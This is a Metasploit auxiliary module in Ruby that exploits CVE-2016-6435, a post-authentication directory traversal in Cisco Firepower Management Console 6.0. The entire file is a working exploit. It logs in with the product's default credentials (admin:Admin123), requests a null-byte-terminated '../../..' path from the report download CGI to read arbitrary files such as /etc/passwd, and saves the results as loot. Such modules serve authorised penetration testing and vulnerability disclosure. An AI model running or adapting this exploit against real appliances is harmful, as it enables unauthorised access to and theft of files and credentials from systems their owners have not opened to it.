##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal",
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Cisco Firepower Management
        under the context of www user. Authentication is required to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Matt',   # Original discovery && PoC
          'sinn3r', # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2016-6435'],
          ['URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking']
        ],
      'DisclosureDate' => "Oct 10 2016",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true,
          'SSLVersion' => 'Auto'
        }
    ))

    register_options(
      [
        # admin:Admin123 is the default credential for 6.0.1
        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),
        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),
        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd'])
      ])
  end

  def do_login(ip)
    console_user = datastore['USERNAME']
    console_pass = datastore['PASSWORD']
    uri          = normalize_uri(target_uri.path, 'login.cgi')

    print_status("Attempting to login in as #{console_user}:#{console_pass}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'vars_post' => {
        'username' => console_user,
        'password' => console_pass,
        'target'   => ''
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')
    end

    res_cookie = res.get_cookies
    if res.code == 302 && res_cookie.include?('CGISESSID')
      cgi_sid = res_cookie.scan(/CGISESSID=(\w+);/).flatten.first
      vprint_status("CGI Session ID: #{cgi_sid}")
      print_good("Authenticated as #{console_user}:#{console_pass}")
      report_cred(ip: ip, user: console_user, password: console_pass)
      return cgi_sid
    end

    nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: rport,
      service_name: 'cisco',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def download_file(cgi_sid, file)
    file_path = "../../..#{Rex::FileUtils.normalize_unix_path(file)}\x00"
    print_status("Requesting: #{file_path}")
    send_request_cgi({
      'method' => 'GET',
      'cookie' => "CGISESSID=#{cgi_sid}",
      'uri'    => normalize_uri(target_uri.path, 'events/reports/view.cgi'),
      'vars_get' => {
        'download' => '1',
        'files'    => file_path
      }
    })
  end

  def remote_file_exists?(res)
    (
      res.headers['Content-Disposition'] &&
      res.headers['Content-Disposition'].match(/attachment; filename=/) &&
      res.headers['Content-Type'] &&
      res.headers['Content-Type'] == 'application/octet-stream'
    )
  end

  def save_file(res, ip)
    fname = res.headers['Content-Disposition'].scan(/filename=(.+)/).flatten.first || File.basename(datastore['FILEPATH'])

    path = store_loot(
      'cisco.https',
      'application/octet-stream',
      ip,
      res.body,
      fname
      )

    print_good("File saved in: #{path}")
  end

  def run_host(ip)
    cgi_sid = do_login(ip)

    unless cgi_sid
      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')
    end

    res = download_file(cgi_sid, datastore['FILEPATH'])

    if res.nil?
      print_error("Connection timed out while downloading: #{datastore['FILEPATH']}")
    elsif remote_file_exists?(res)
      save_file(res, ip)
    else
      print_error("Remote file not found: #{datastore['FILEPATH']}")
    end
  end
end
